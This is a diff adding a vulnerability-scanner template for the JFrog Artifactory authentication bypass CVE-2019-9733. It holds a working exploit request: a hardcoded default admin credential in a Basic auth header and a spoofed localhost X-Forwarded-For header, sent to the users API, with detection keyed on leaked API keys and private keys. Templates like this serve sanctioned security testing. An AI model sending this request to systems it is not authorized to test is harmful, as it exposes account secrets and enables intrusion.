@@ -1,0 +1,31 @@
+id: jfrog-auth-bypass
+donce: true
+info:
+  name: JFrog Auth Bypass (CVE-2019-9733)
+  risk: Potential
+
+params:
+  - root: '{{.BaseURL}}'
+
+replicate:
+  ports: '8081'
+  prefixes: 'artifactory'
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/api/access/api/v1/users/
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4271.0 Safari/537.36
+      - Authorization: Basic YWNjZXNzLWFkbWluOnBhc3N3b3Jk
+      - Accept: '*/*'
+      - X-Forwarded-For: 127.0.0.1
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "password_last_modified") && StringSearch("response", "apiKey") && StringSearch("response", "private_key")
+
+references:
+  - links:
+      - https://www.ciphertechs.com/blog/jfrog-artifactory-advisory/
+      - https://www.errno.fr/artifactory/Attacking_Artifactory
